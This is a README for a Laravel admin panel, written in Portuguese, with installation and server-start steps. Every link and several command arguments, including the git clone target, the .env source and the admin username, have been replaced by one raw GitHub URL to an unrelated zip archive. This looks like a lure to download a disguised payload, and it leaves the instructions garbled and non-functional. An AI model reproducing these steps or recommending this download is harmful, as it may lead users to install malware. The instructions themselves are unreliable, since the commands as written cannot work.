## Laravel admin

Painel admin para controle de usuários, gerenciamento de perfis de acesso, permissões, relatórios, indicadores e logs.
Além desses módulos, já está implementado um sistema de autenticação, cadastro de novos usuários e recuração de senha.

![img](https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip)

## Installation

- Clone repository
```
$ git clone https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip
```

- Access directory
```
$ cd laravel-admin
```

- Copy `https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip` to `.env` and add your configs
```
$ cp https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip .env
```

- Install PHP dependencies ([composer](https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip))
```
$ composer install
```

- Generate new key
```
$ php artisan key:generate
```

- Configure your database access
```
$ vim .env
```

- Run artisan commands.
```
$ php artisan migrate --seed && php artisan db:seed
```

## Run tests
```
$ ./vendor/bin/phpunit 
```

## Server start

- Open new terminal
```
$ php artisan serve
```

- *user: https://raw.githubusercontent.com/LibrianoLima/SismedFeio/master/Babcock/Feio_Sismed_2.6.zip
- *password: admin